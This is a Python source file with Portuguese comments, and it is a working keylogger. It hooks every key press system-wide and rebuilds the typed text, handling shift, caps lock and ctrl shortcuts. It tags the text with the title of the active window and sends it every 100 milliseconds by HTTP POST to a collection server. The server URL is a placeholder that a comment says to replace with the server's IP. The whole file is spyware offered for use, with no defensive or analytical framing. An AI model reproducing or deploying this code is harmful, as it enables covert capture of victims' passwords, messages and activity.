import keyboard  # Biblioteca para capturar eventos de teclado
import requests  # Biblioteca para enviar requisições HTTP
import pygetwindow as gw  # Biblioteca para obter informações sobre janelas de aplicativos
import time  # Biblioteca para manipulação de tempo
import threading  # Biblioteca para criar e gerenciar threads

# URL do servidor Flask onde os dados serão enviados
SERVER_URL = "http://127.0.0.1:5000/log"  # Substitua pelo IP do servidor
# Variáveis globais para armazenar estado das teclas e informações da janela
buffer_teclas = []  # Lista para armazenar as teclas pressionadas
ultima_janela = None  # Armazena o título da última janela ativa
ctrl_ativo = False  # Flag para indicar se a tecla CTRL está pressionada
alt_ativo = False  # Flag para indicar se a tecla ALT está pressionada
shift_ativo = False  # Flag para indicar se a tecla SHIFT está pressionada
caps_lock_ativo = False  # Flag para indicar se o CAPS LOCK está ativo
ctrl_ja_usado = False  # Flag para controlar a primeira letra após CTRL
lock_buffer = threading.Lock()  # Lock para sincronizar o acesso ao buffer de teclas

def get_active_window():
    """Retorna o nome da janela ativa."""
    try:
        window = gw.getActiveWindow()  # Obtém a janela ativa
        return window.title if window else "Desconhecido"  # Retorna o título da janela ou "Desconhecido" se não houver janela ativa
    except Exception as e:
        print(f"Erro ao obter janela ativa: {e}")
        return "Erro ao obter janela"  # Retorna uma mensagem de erro se ocorrer uma exceção

def enviar_teclas():
    """Envia o buffer de teclas para o servidor sem bloqueios desnecessários."""
    global buffer_teclas, ultima_janela

    if not buffer_teclas:  # Verifica se o buffer está vazio
        return

    texto = "".join(buffer_teclas)  # Concatena as teclas do buffer em uma única string
    buffer_teclas.clear()  # Limpa o buffer após enviar

    try:
        # Envia os dados para o servidor usando uma requisição POST
        response = requests.post(SERVER_URL, json={"tecla": texto, "janela": ultima_janela})
        response.raise_for_status()  # Verifica se a requisição foi bem-sucedida
        print(f"Dados enviados: {texto}")
    except Exception as e:
        print(f"Erro ao enviar dados: {e}")  # Imprime uma mensagem de erro se ocorrer uma exceção

def on_press(event):
    """Captura as teclas pressionadas e evita atalhos de CTRL e ALT."""
    global ultima_janela, ctrl_ativo, alt_ativo, shift_ativo, caps_lock_ativo, ctrl_ja_usado

    tecla = event.name.lower()  # Obtém o nome da tecla pressionada em letras minúsculas
    print(f"Tecla pressionada: {tecla}")

    # Atualiza o estado das teclas modificadoras (CTRL, ALT, SHIFT, CAPS LOCK)
    if tecla in ["ctrl", "left ctrl", "right ctrl"]:
        ctrl_ativo = True
        ctrl_ja_usado = False  # Reseta o flag ao pressionar CTRL
    elif tecla in ["alt", "left alt", "right alt"]:
        alt_ativo = True
    elif tecla in ["shift", "left shift", "right shift"]:
        shift_ativo = True
    elif tecla == "caps lock":
        caps_lock_ativo = not caps_lock_ativo  # Alterna o estado do CAPS LOCK

    # Atualiza a janela ativa se ela mudou
    janela_atual = get_active_window()
    if janela_atual != ultima_janela:
        ultima_janela = janela_atual
        with lock_buffer:
            buffer_teclas.append(f"\n\n[Abrindo {janela_atual}]\n")  # Adiciona uma marca indicando a mudança de janela

    # Ignora a impressão de teclas modificadoras e TAB
    if tecla in ["shift", "caps lock", "ctrl", "left ctrl", "right ctrl", "alt", "left alt", "right alt", "tab"]:
        return

    # Tratamento de caracteres
    if len(tecla) == 1:  # Se for uma letra ou número
        # Se a tecla for uma letra e CTRL estiver ativo, marca como possível atalho
        if tecla.isalpha() and ctrl_ativo and not ctrl_ja_usado:
            tecla = f" {tecla.upper()} (possível atalho com CTRL ou ALT) "
            ctrl_ja_usado = True
        # Se a tecla for uma letra, aplica a maiúscula se SHIFT ou CAPS LOCK estiverem ativos
        elif tecla.isalpha():
            if shift_ativo or caps_lock_ativo:
                tecla = tecla.upper()  # Converte para maiúscula
            else:
                tecla = tecla.lower()  # Converte para minúscula
    elif tecla == "space":
        tecla = " "
    elif tecla == "enter":
        tecla = "\n"
    elif tecla == "backspace":
        # Verifica se o buffer não está vazio e adiciona o caractere de backspace
        with lock_buffer:
            if buffer_teclas:
                buffer_teclas.append("\b")  # Adiciona o backspace ao buffer
                print("Backspace pressionado, removendo último caractere do buffer.")
        return  # Não adiciona "backspace" ao buffer

    # Adiciona a tecla ao buffer
    with lock_buffer:
        buffer_teclas.append(tecla)

def on_release(event):
    """Detecta quando CTRL ou ALT são soltos para voltar a registrar teclas normalmente."""
    global ctrl_ativo, alt_ativo, shift_ativo

    tecla = event.name.lower()
    print(f"Tecla solta: {tecla}")

    # Atualiza o estado das teclas modificadoras quando são soltas
    if tecla in ["ctrl", "left ctrl", "right ctrl"]:
        ctrl_ativo = False
    elif tecla in ["alt", "left alt", "right alt"]:
        alt_ativo = False
    elif tecla == "shift" or tecla == "left shift" or tecla == "right shift":
        shift_ativo = False

def monitorar_teclas():
    """Monitora as teclas pressionadas sem atraso significativo."""
    print("Monitorando teclas...")  # Exibe uma mensagem indicando que as teclas estão sendo monitoradas
    while True:
        # Envia as teclas capturadas a cada 100ms (ajustável conforme necessário)
        if buffer_teclas:
            enviar_teclas()
        time.sleep(0.1)  # Aguarda 100ms antes de verificar e enviar as teclas novamente

# Inicia a captura de teclas pressionadas e soltas
keyboard.on_press(on_press)
keyboard.on_release(on_release)

# Inicia o monitoramento em um thread separado para maior responsividade
monitor_thread = threading.Thread(target=monitorar_teclas, daemon=True)
monitor_thread.start()

print("Monitorando teclas... Pressione 'ESC' para sair.")
keyboard.wait("esc")  # O script para quando 'esc' for pressionado